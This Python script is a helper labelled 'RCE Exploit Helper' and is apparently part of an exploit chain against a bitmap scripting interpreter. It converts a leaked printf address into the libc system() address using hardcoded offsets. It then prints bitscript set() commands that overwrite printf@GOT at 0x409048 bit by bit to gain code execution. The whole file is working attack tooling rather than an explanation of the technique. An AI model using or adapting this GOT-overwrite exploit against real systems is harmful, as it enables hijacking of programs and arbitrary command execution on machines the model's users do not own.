#!/usr/bin/env python3
"""
Calculate system address and generate bitscript code to write it to GOT
"""

def calculate_system_addr(libc_printf_addr):
    """Calculate system() address from leaked printf address"""
    printf_offset = 0x60100
    system_offset = 0x58750
    
    libc_base = libc_printf_addr - printf_offset
    system_addr = libc_base + system_offset
    
    return system_addr

def generate_write_code(value, bit_index_start, bitmap_name="b1"):
    """Generate bitscript code to write 64-bit value"""
    code = []
    for bit in range(64):
        x = bit_index_start + bit
        y = 0
        bit_value = (value >> bit) & 1
        code.append(f"set({bitmap_name}, {x}, {y}, {bit_value});")
    return code

def main():
    print("=== RCE Exploit Helper ===")
    print()
    print("After running rce_full_exploit.bs, you'll get libc_printf_addr")
    print("Enter that value to calculate system address and generate write code")
    print()
    
    # Example with placeholder
    libc_printf_addr = int(input("Enter leaked printf address (decimal): ") or "0")
    
    if libc_printf_addr == 0:
        print("Using example address: 0x7ffff7e60100")
        libc_printf_addr = 0x7ffff7e60100
    
    system_addr = calculate_system_addr(libc_printf_addr)
    
    print(f"\nCalculated system address: 0x{system_addr:x} ({system_addr})")
    print()
    
    # Calculate coordinates for writing to printf@GOT (0x409048)
    printf_got = 0x409048
    # We need bitmap_data_ptr - estimate from targetaddr
    # For now, assume we know the offset
    print("To write system address to printf@GOT (0x409048):")
    print("Need to calculate offset from bitmap_data_ptr")
    print("This depends on your heap layout")
    print()
    print("If you know the offset, generate write code:")
    print()
    
    # Example: if offset is known
    offset = int(input("Enter offset from bitmap_data_ptr to 0x409048 (bytes): ") or "0")
    
    if offset != 0:
        bit_index = offset * 8
        print(f"\nGenerating write code for system address 0x{system_addr:x}:")
        print(f"Starting at bit_index {bit_index}")
        print()
        code = generate_write_code(system_addr, bit_index)
        for line in code:
            print(line)

if __name__ == "__main__":
    main()

